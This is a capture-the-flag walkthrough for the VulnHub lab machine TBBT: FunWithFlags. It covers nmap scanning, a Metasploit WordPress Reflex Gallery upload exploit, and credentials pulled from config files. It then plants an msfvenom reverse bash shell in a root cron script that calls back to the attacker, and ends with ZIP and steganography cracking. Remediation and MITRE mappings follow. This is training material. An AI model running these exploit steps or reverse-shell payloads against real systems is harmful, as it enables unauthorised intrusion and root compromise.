# TBBT: FunWithFlags — Bazinga! Seven Flags Hidden Across Pasadena

Look at guys!! TBBT: FunWithFlags is the CTF machine for everyone who grew up watching The Big Bang Theory. Seven flags, seven characters, seven different hiding techniques. Sheldon is waiting at port 1337, Amy is inside a binary, Penny is encoded in base64, Leonard needs a root cron exploit, Bernadette is locked in a database, Raj is hiding in WordPress, and Howard needs you to crack a ZIP and decode steganography. No cap, this machine teaches a tremendous variety of techniques in a single, cohesive, and thematic environment. Bazinga! Big thanks to the creator for the creative flag design.

| Field | Value |
|---|---|
| **Level** | Intermediate |
| **Target VM** | TBBT: FunWithFlags |
| **Attacker VM** | Kali Linux |
| **VulnHub URL** | https://www.vulnhub.com/entry/tbbt-funwithflags,437/ |
| **Techniques** | Nmap service enumeration, web directory brute-force, WPScan WordPress enumeration, Metasploit Reflex Gallery file upload RCE, binary string extraction, base64 decode, MySQL credential enumeration, WordPress database credential extraction, writable root cron script injection, FTP anonymous access, ZIP password cracking (fcrackzip), image steganography (stegcracker) |
| **CVEs** | CVE-2015-4133 (WordPress Reflex Gallery arbitrary file upload), CWE-312 (Cleartext Storage of Credentials: binary/config file), CWE-732 (Incorrect Permission Assignment: world-writable cron script) |
| **APT Groups** | FIN7: uses WordPress plugin vulnerabilities for initial access in retail and hospitality sectors; APT41: exploits CMS vulnerabilities combined with credential harvesting from config files for lateral movement |

---

## Attack Summary

```
netdiscover → 192.168.1.105
    |
    v
nmap → port 21 (FTP), 22 (SSH), 80 (HTTP), 1337 (custom)
    |
    v
nc 192.168.1.105 1337 → FLAG 1 (Sheldon)
    |
    v
dirb → /music/wordpress/ → wpscan → Reflex Gallery plugin
    |
    v
MSF: exploit/unix/webapp/wp_reflex_file_upload → Meterpreter (www-data)
    |
    v
/home/amy/secretdiary → strings → FLAG 2 (Amy) + password P@SSw0rd123Sh3ld0n
    |
    v
/home/penny/.FLAG.penny.txt | base64 -d → FLAG 3 (Penny)
    |
    v
/etc/crontab → root runs /home/leonard/thermostat_set_temp.sh → write reverse shell
    |
    v
nc listener → root shell → /root/Flag-leonard.txt → FLAG 4 (Leonard)
    |
    v
/var/www/html/private/db_config.php → bigpharmacorp:weareevil → mysql → FLAG 5 (Bernadette)
    |
    v
/var/www/html/music/wordpress/wp-config.php → mysql footprintsonthemoon → FLAG 6 (Raj)
    |
    v
FTP anonymous → /pub/howard/super_secret_nasa_stuff_here.zip
    → fcrackzip → astronaut → unzip → marsroversketch.jpg
    → stegcracker → iloveyoumom → FLAG 7 (Howard)
```

---

## Methodology

1. Host discovery and full port scan
2. Custom port 1337 banner grab for first flag
3. Web directory brute-force and WordPress enumeration
4. Exploit Reflex Gallery plugin for Meterpreter shell
5. Enumerate home directories for flags and credentials
6. Read and decode flag from penny home directory
7. Exploit writable root cron script for privilege escalation
8. Extract database credentials from config files
9. Enumerate WordPress and private MySQL databases for flags
10. Anonymous FTP access, ZIP crack, steganography for final flag

---

## Step 1 — Host Discovery and Port Scan

```bash
sudo netdiscover -i eth1 -r 192.168.1.0/24
nmap -p- -A 192.168.1.105
```

```
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
22/tcp   open  ssh     OpenSSH 7.x
80/tcp   open  http    Apache httpd 2.4.x
1337/tcp open  waste?
```

Four services. Port 1337 is non-standard and immediately suspicious. On CTF machines, non-standard ports with no obvious service often contain hidden data.

**MITRE ATT&CK:** T1046 — Network Service Discovery

---

## Step 2 — Flag 1: Sheldon (Port 1337 Banner)

Connect directly to port 1337:

```bash
nc 192.168.1.105 1337
```

```
FLAG-sheldon{cf88b37e8cb10c4005c1f2781a069cf8}
```

Bazinga! First flag collected without any exploit. Sheldon would approve of this level of simplicity.

**Real-world note:** Non-standard ports running custom services that expose data without authentication are a common information disclosure pattern. In real environments, developers often open debug listeners, status endpoints, or testing services that they forget to close before production deployment.

**MITRE ATT&CK:** T1046 — Network Service Discovery; T1595.002 — Active Scanning: Vulnerability Scanning

---

## Step 3 — Web Enumeration and WordPress Discovery

```bash
dirb http://192.168.1.105/
```

Discovers `/music/wordpress/`. Enumerate the WordPress installation:

```bash
wpscan --url http://192.168.1.105/music/wordpress/ --enumerate p,u
```

Output reveals:
- WordPress version: 4.x (outdated)
- Plugin: **Reflex Gallery** (vulnerable to arbitrary file upload)
- Users: (enumerate with `--enumerate u`)

**MITRE ATT&CK:** T1083 — File and Directory Discovery; T1595.003 — Active Scanning: Wordlist Scanning

---

## Step 4 — WordPress Reflex Gallery Exploit (CVE-2015-4133)

Reflex Gallery WordPress plugin before version 3.1.4 allows unauthenticated file upload. Use Metasploit:

```bash
msfconsole -q
use exploit/unix/webapp/wp_reflex_file_upload
set RHOSTS 192.168.1.105
set TARGETURI /music/wordpress
set LHOST 192.168.1.103
set LPORT 4444
exploit
```

```
[*] Meterpreter session 1 opened

meterpreter > getuid
Server username: www-data

meterpreter > shell
$ cd /home && ls
amy  bernadette  howard  leonard  penny  raj  sheldon
```

Seven home directories, one per TBBT character. Each hides a flag.

**Real-world note:** CVE-2015-4133 is a decade-old vulnerability still found in production WordPress installations. FIN7 actively exploits outdated WordPress plugins for initial access in retail and hospitality attacks. Always keep WordPress plugins updated and remove unused plugins.

**MITRE ATT&CK:** T1190 — Exploit Public-Facing Application; T1505.003 — Server Software Component: Web Shell

---

## Step 5 — Flag 2: Amy (Strings from Binary)

```bash
$ cd /home/amy
$ ls
notes.txt  secretdiary
$ strings secretdiary
```

Output reveals:

```
Password: P@SSw0rd123Sh3ld0n
FLAG-amy{60263777358690b90e8dbe8fea6943c9}
```

The `secretdiary` binary has hardcoded plaintext credentials and a flag embedded in its string table. The `strings` command extracts printable text from binary files, including hardcoded credentials.

**Real-world note:** Hardcoded credentials in binaries are a persistent finding in software security assessments. The `strings` command is one of the first tools run against any unknown binary. Credentials must be stored in secure vaults or environment variables, never compiled into executables.

**MITRE ATT&CK:** T1552.001 — Credentials in Files

---

## Step 6 — Flag 3: Penny (Base64 Encoded File)

```bash
$ cd /home/penny
$ ls -la
-rw-r--r-- 1 penny penny   42 .FLAG.penny.txt
$ cat .FLAG.penny.txt | base64 -d
FLAG-penny{dace52bdb2a0b3f899dfb3423a992b25}
```

The flag is base64-encoded in a hidden file (prefixed with `.` to be less visible in standard `ls` output). Always use `ls -la` to see hidden files.

**MITRE ATT&CK:** T1083 — File and Directory Discovery

---

## Step 7 — Flag 4: Leonard (Root Cron Script Injection)

Check the system crontab:

```bash
$ cat /etc/crontab
* * * * * root /home/leonard/thermostat_set_temp.sh
```

A root cron job runs `thermostat_set_temp.sh` every minute. Check permissions:

```bash
$ ls -la /home/leonard/thermostat_set_temp.sh
-rwxrwxrwx 1 leonard leonard 35 thermostat_set_temp.sh
```

World-writable by www-data. Inject a reverse shell payload:

```bash
# From Meterpreter
msfvenom -p cmd/unix/reverse_bash LHOST=192.168.1.103 LPORT=1234 -f raw > /tmp/payload.sh
upload /tmp/payload.sh /home/leonard/thermostat_set_temp.sh
```

Start a netcat listener on the attacker:

```bash
nc -lvnp 1234
```

Wait up to 60 seconds. The cron fires as root:

```bash
id
# uid=0(root) gid=0(root) groups=0(root)
cat /root/Flag-leonard.txt
# FLAG-leonard{17fc95224b65286941c54747704acd3e}
```

**Real-world note:** World-writable cron scripts executed by root are a direct and reliable privilege escalation path. In real penetration tests, `cat /etc/crontab` and `ls -la` on all referenced scripts is standard post-exploitation enumeration. The fix: ensure all cron scripts are owned by root with mode 700 or 750.

**MITRE ATT&CK:** T1053.003 — Scheduled Task: Cron; T1548 — Abuse Elevation Control Mechanism

---

## Step 8 — Flag 5: Bernadette (Database Credentials + MySQL)

```bash
$ cat /var/www/html/private/db_config.php
```

```php
$db_user = "bigpharmacorp";
$db_pass = "weareevil";
$db_name = "bigpharmacorp";
```

Connect to MySQL:

```bash
mysql -u bigpharmacorp -pweareevil
```

```sql
use bigpharmacorp;
show tables;
select * from users;
```

```
FLAG-bernadette{f42d950ab0e966198b66a5c719832d5f}
```

**MITRE ATT&CK:** T1552.001 — Credentials in Files; T1213 — Data from Information Repositories

---

## Step 9 — Flag 6: Raj (WordPress Database)

```bash
$ cat /var/www/html/music/wordpress/wp-config.php
```

```
DB_NAME: footprintsonthemoon
DB_USER: footprintsonthemoon
DB_PASSWORD: footprintsonthemoon1337
```

```bash
mysql -u footprintsonthemoon -pfootprintsonthemoon1337
```

```sql
use footprintsonthemoon;
show tables;
select * from wp_posts where post_status = 'private';
-- or
select * from wp_users;
```

```
FLAG-raz{40d17a74e28a62eac2df19e206f0987c}
```

Note: the flag says "raz" but the character is Raj. A small typo in the machine, not a mistake on your end.

**MITRE ATT&CK:** T1552.001 — Credentials in Files; T1213 — Data from Information Repositories

---

## Step 10 — Flag 7: Howard (FTP Anonymous + ZIP Crack + Steganography)

```bash
ftp 192.168.1.105
# User: anonymous
# Password: (press Enter)

ftp> cd pub/howard
ftp> get super_secret_nasa_stuff_here.zip
ftp> quit
```

Crack the ZIP password:

```bash
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt super_secret_nasa_stuff_here.zip
```

```
PASSWORD FOUND!!!!: pw == astronaut
```

Extract the ZIP:

```bash
unzip -P astronaut super_secret_nasa_stuff_here.zip
# Extracts: marsroversketch.jpg
```

Extract hidden data from the image with steganography:

```bash
stegcracker marsroversketch.jpg /usr/share/wordlists/rockyou.txt
```

```
StegCracker 2.0.9 - ...
Trying wordlist: /usr/share/wordlists/rockyou.txt
Extracted payload: 'iloveyoumom' was successful!
```

```bash
cat marsroversketch.jpg.out
# FLAG-howard{...}
```

Howard's flag is hidden inside a JPEG using steganography, behind a ZIP password, inside an anonymous FTP server. Three layers for the last flag!

**Real-world note:** Steganography is used in real threat actor operations to hide malware, exfiltrated data, and C2 communications inside seemingly innocuous image files. APT32 (OceanLotus) used steganography to hide malware payloads in PNG files served from legitimate-looking websites.

**MITRE ATT&CK:** T1027 — Obfuscated Files or Information; T1021.003 — Remote Services: FTP

---

## Captured Flags, Hashes and Credentials

| Character | Flag | Found At | Technique |
|---|---|---|---|
| Sheldon | `FLAG-sheldon{cf88b37e8cb10c4005c1f2781a069cf8}` | Port 1337 banner | Direct connection |
| Amy | `FLAG-amy{60263777358690b90e8dbe8fea6943c9}` | /home/amy/secretdiary | Binary strings |
| Penny | `FLAG-penny{dace52bdb2a0b3f899dfb3423a992b25}` | /home/penny/.FLAG.penny.txt | Base64 decode |
| Leonard | `FLAG-leonard{17fc95224b65286941c54747704acd3e}` | /root/Flag-leonard.txt | Cron script injection |
| Bernadette | `FLAG-bernadette{f42d950ab0e966198b66a5c719832d5f}` | MySQL bigpharmacorp DB | DB credential extraction |
| Raj | `FLAG-raz{40d17a74e28a62eac2df19e206f0987c}` | MySQL WordPress DB | wp-config.php credentials |
| Howard | In steg output | FTP + ZIP + JPEG steg | Multi-layer extraction |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---|---|---|
| 1 | Debug/test service on port 1337 exposes flag | Developers leave test listeners open in production environments | Audit all open ports; close non-production services before deployment |
| 2 | Outdated WordPress plugin (Reflex Gallery) allows RCE | CVE-2015-4133 is 10+ years old but still found in production | Keep all CMS plugins updated; remove unused plugins; use WAF |
| 3 | Hardcoded credentials in binary executable | Binary strings extraction is trivially fast | Never hardcode credentials; use environment variables or secrets management |
| 4 | World-writable cron script executed as root | Classic, reliable privilege escalation vector | All cron scripts: owned by root, permissions 700 or 750 |
| 5 | Database credentials in PHP config files | wp-config.php and db_config.php are high-value targets | Restrict file permissions; move configs above webroot; use secrets managers |
| 6 | Anonymous FTP with sensitive files | FTP anonymous access is deprecated; still widely enabled | Disable anonymous FTP; require authentication; use SFTP |
| 7 | Steganography in FTP-hosted images | Used by APT32 and others for covert C2 and data hiding | Deep content inspection; steg detection in DLP solutions |

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP ID |
|---|---|---|---|
| Reconnaissance | Discovery | Network Service Discovery | T1046 |
| Reconnaissance | Discovery | Wordlist Scanning | T1595.003 |
| Initial Access | Initial Access | Exploit Public-Facing Application | T1190 |
| Credential Access | Credential Access | Credentials in Files | T1552.001 |
| Execution | Execution | Command and Scripting Interpreter: Unix Shell | T1059.004 |
| Persistence | Persistence | Server Software Component: Web Shell | T1505.003 |
| Discovery | Discovery | File and Directory Discovery | T1083 |
| Persistence | Persistence | Scheduled Task: Cron | T1053.003 |
| Privilege Escalation | Privilege Escalation | Abuse Elevation Control Mechanism | T1548 |
| Collection | Collection | Data from Information Repositories | T1213 |
| Defense Evasion | Defense Evasion | Obfuscated Files or Information | T1027 |
| Lateral Movement | Lateral Movement | Remote Services: FTP | T1021.003 |

---

## Remediation and Containment

### Technical Fixes

1. **Close port 1337:** no debug or test services in production
2. **Update WordPress and all plugins:** especially remove or update Reflex Gallery
3. **Eliminate hardcoded credentials:** use environment variables or secrets managers
4. **Fix cron script permissions:** `chown root:root /home/leonard/thermostat_set_temp.sh && chmod 700 /home/leonard/thermostat_set_temp.sh`
5. **Restrict database config file permissions:** `chmod 640 wp-config.php db_config.php`
6. **Disable anonymous FTP:** `anonymous_enable=NO` in vsftpd.conf; use SFTP
7. **Implement DLP with steg detection:** flag suspicious image files in data flows

### NIST CSF 2.0

| Function | Category | Action |
|---|---|---|
| Identify | Asset Management | Inventory all services including non-standard ports |
| Protect | Access Control | Remove anonymous FTP; restrict database config permissions |
| Protect | Data Security | No credentials in files accessible to service accounts; use secrets managers |
| Detect | Anomalies and Events | Alert on new files in web root; cron execution anomalies |
| Respond | Response Planning | Remove webshells; rotate all credentials found |
| Recover | Recovery Planning | Rebuild compromised host; audit all data accessed |

### NIST SP 800-53 Rev. 5

| Control | Description | Application |
|---|---|---|
| AC-3 | Access Enforcement | Restrict cron script write access; no anonymous FTP |
| AC-6 | Least Privilege | www-data must not write to cron scripts owned by other users |
| CM-7 | Least Functionality | Disable port 1337 debug service; disable anonymous FTP |
| IA-5 | Authenticator Management | No hardcoded credentials; use secrets management |
| SC-28 | Protection of Information at Rest | Protect database credentials with appropriate file permissions |
| SI-2 | Flaw Remediation | Patch CVE-2015-4133 (Reflex Gallery) immediately |

### CISA KEV

CVE-2015-4133 (WordPress Reflex Gallery file upload) was exploited in multiple mass WordPress compromises. Update immediately per CISA vulnerability management guidance.

### C2M2

| Domain | Practice | Target MIL |
|---|---|---|
| Identity and Access Management (IAM) | Manage Privileges and Accounts | MIL3 |
| Threat and Vulnerability Management (THREAT) | Perform Vulnerability Assessments | MIL2 |
| Asset, Change, and Configuration Management (ASSET) | Manage IT Asset Inventory | MIL2 |

### MITRE D3FEND

- **D3-ACH** — Application Configuration Hardening (patch Reflex Gallery; close debug ports)
- **D3-OAM** — Operating System Administrative Management (fix cron permissions)
- **D3-FH** — File Hashing (FIM on web root and cron scripts)
- **D3-HBPI** — Harden Build Pipeline Integrity (no hardcoded credentials in deployments)

---

## Final Thoughts

TBBT: FunWithFlags is an absolute gem of a CTF machine. The thematic design keeps you engaged as you hunt down each character's flag using a different technique. Sheldon needs a simple connection, Howard needs three layers of extraction, and everyone in between requires a specific skill. The breadth of techniques covered (web exploit, binary analysis, encoding, cron abuse, database enum, FTP, steganography) makes this one of the best training machines for beginners who want exposure to a wide attack surface in one sitting. Bazinga!

Thanks guys!! (❍ᴥ❍ʋ)
